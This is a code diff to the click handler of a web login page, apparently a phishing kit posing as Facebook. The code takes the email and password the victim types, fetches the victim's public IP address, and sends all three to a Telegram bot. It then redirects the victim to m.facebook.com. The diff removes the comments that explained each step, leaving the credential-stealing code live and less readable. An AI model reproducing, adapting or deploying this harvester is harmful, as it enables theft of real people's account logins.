@@ -14,13 +14,13 @@ document.getElementById('loginButton').addEventListener('click', function () {
     return;
   }
 
-  // Fetch the Public IP Address
+  
   fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
       const userIP = data.ip;
 
-      // Send Logs to Telegram Bot
+      
       const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP: ${userIP}`;
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
@@ -40,8 +40,8 @@ document.getElementById('loginButton').addEventListener('click', function () {
           console.error('Error sending message to Telegram:', error);
         });
 
-      // Redirect to Another Page
-      window.location.href = 'https://m.facebook.com'; // Replace with your redirection URL
+      
+      window.location.href = 'https://m.facebook.com'; 
     })
     .catch(error => {
       console.error('Error fetching IP address:', error);
